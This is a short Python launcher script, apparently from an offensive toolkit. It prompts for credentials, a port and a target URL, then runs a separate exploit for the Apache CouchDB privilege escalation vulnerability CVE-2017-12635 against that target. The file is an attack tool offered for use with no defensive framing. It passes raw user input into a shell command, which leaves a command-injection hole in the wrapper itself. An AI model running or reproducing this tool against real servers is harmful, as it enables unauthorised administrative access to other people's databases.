#Exploits the Apache CouchDB JSON Remote Privilege Escalation Vulnerability
#(CVE-2017-12635)
import subprocess as sub

class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'
    green = '\033[0;32m'

def main(port, user, password, target):
    sub.call(f"python ../0days/Apache-CouchDB-1.7.0-and-2.x-before-2.1.1-Remote-Privilege-Escalation.py -u {user} -p {port} -P {password} {target}", shell=True)
main(user=input(f"{Colors.red}(Apache-CouchDB-Pre-Authenticated-Remote-Privilege-Escalation){Colors.end} [Enter Username]:~#"),
     password=input(f"{Colors.red}(Apache-CouchDB-Pre-Authenticated-Remote-Privilege-Escalation){Colors.end} [Enter Password]:~#"),
     port=int(input(f"{Colors.red}(Apache-CouchDB-Pre-Authenticated-Remote-Privilege-Escalation){Colors.end} [Enter Port Number]:~#")),
     target=input(f"{Colors.red}(Apache-CouchDB-Pre-Authenticated-Remote-Privilege-Escalation){Colors.end} [Enter Target URL]:~#"))